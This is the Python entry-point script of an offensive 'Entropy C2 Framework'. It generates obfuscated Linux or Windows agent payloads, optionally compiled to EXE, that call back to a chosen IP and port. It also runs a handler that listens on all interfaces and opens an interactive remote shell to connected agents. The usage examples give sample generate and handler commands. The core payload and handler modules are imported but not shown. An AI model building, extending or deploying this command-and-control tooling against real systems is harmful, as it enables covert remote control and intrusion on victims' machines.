#!/usr/bin/env python3
"""
Entropy C2 Framework
Author: jdb / httpbnry

Usage:
  python3 entropy.py generate --ip <IP> --port <PORT> [options]
  python3 entropy.py handler --port <PORT> [options]
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from modules.crypto import generate_key
from modules.handler import Handler
from modules.agent import generate_payload

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
N = "\033[0m"
S = "\033[1m"
D = "\033[2m"


def c(text, color):
    return f"{color}{text}{N}"


BANNER = f"""
 {c('███████╗███╗   ██╗████████╗██████╗  ██████╗ ██████╗ ██╗   ██╗', C)}
 {c('██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██╔══██╗╚██╗ ██╔╝', C)}
 {c('█████╗  ██╔██╗ ██║   ██║   ██████╔╝██║   ██║██████╔╝ ╚████╔╝ ', C)}
 {c('██╔══╝  ██║╚██╗██║   ██║   ██╔══██╗██║   ██║██╔══██╗  ╚██╔╝  ', C)}
 {c('███████╗██║ ╚████║   ██║   ██║  ██║╚██████╔╝██║  ██║   ██║   ', C)}
 {c('╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ', C)}
 {c('═' * 58, D)}
 {c('  C2 Framework  v1.0  |  Author: jdb / httpbnry', Y)}
 {c('═' * 58, D)}
"""


def print_banner():
    print(BANNER)
    print()


def cmd_generate(args):
    key = args.key.encode() if args.key else None

    print_banner()
    print(f" {c('[*]', B)} Generating payload...\n")

    try:
        filepath, key_str, exe_path = generate_payload(
            ip=args.ip,
            port=args.port,
            os_type=args.os,
            key=key,
            obfuscation=args.obf,
            compile_exe=args.exe,
            output_dir=args.output,
            name=args.name,
        )
    except Exception as e:
        print(f" {c('[!]', R)} Failed to generate payload: {e}")
        sys.exit(1)

    print(f" {c('[+]', G)} Payload: {c(filepath, C)}")
    if exe_path:
        print(f" {c('[+]', G)} EXE:     {c(exe_path, C)}")
    print(f" {c('[+]', G)} Key:     {c(key_str, Y)}")
    print()


def cmd_handler(args):
    print_banner()

    if args.gen_key:
        key = generate_key()
        print(f" {c('[+]', G)} Generated key: {c(key.decode(), Y)}")
        print()
    elif args.key:
        key = args.key.encode()
    else:
        print(f" {c('[!]', R)} No key provided. Use --key or --gen-key.")
        sys.exit(1)

    print(f" {c('[*]', B)} Starting handler on {c(f'{args.host}:{args.port}', C)}")
    print(f" {c('[*]', D)} Key: {c(key.decode(), Y)}")
    print()

    handler = Handler(args.host, args.port, key)
    try:
        handler.start()
        handler.shell()
    except OSError as e:
        print(f"\n {c('[!]', R)} {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        pass
    finally:
        handler.stop()
        print(f"\n {c('[*]', B)} Handler stopped.")


def main():
    parser = argparse.ArgumentParser(
        description="Entropy C2 Framework - Command & Control",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 entropy.py generate --ip 10.0.0.5 --port 4443 --os linux\n"
            "  python3 entropy.py generate --ip 10.0.0.5 --obf xor --exe\n"
            "  python3 entropy.py handler --port 4443 --gen-key\n"
            "  python3 entropy.py handler --port 4443 --key <base64-key>\n"
        ),
    )

    sub = parser.add_subparsers(dest="command", help="sub-command")
    sub.required = True

    # --- generate ---
    gen = sub.add_parser("generate", help="Generate agent payload")
    gen.add_argument("--ip", required=True, help="Handler IP address for agent to connect to")
    gen.add_argument("--port", type=int, default=4443, help="Handler port (default: 4443)")
    gen.add_argument("--os", choices=["linux", "windows"], default="linux", help="Target OS (default: linux)")
    gen.add_argument("--obf", choices=["none", "xor", "packed"], default="none", help="Obfuscation mode (default: none)")
    gen.add_argument("--exe", action="store_true", help="Compile to EXE with PyInstaller")
    gen.add_argument("--key", help="Encryption key (auto-generated if omitted)")
    gen.add_argument("--output", default="payloads", help="Output directory (default: payloads)")
    gen.add_argument("--name", help="Output filename (auto-generated if omitted)")

    # --- handler ---
    hdl = sub.add_parser("handler", help="Start C2 handler")
    hdl.add_argument("--port", type=int, default=4443, help="Listen port (default: 4443)")
    hdl.add_argument("--host", default="0.0.0.0", help="Listen address (default: 0.0.0.0)")
    key_group = hdl.add_mutually_exclusive_group(required=False)
    key_group.add_argument("--key", help="Encryption key")
    key_group.add_argument("--gen-key", action="store_true", help="Generate a new encryption key")

    args = parser.parse_args()

    if args.command == "generate":
        cmd_generate(args)
    elif args.command == "handler":
        cmd_handler(args)


if __name__ == "__main__":
    main()
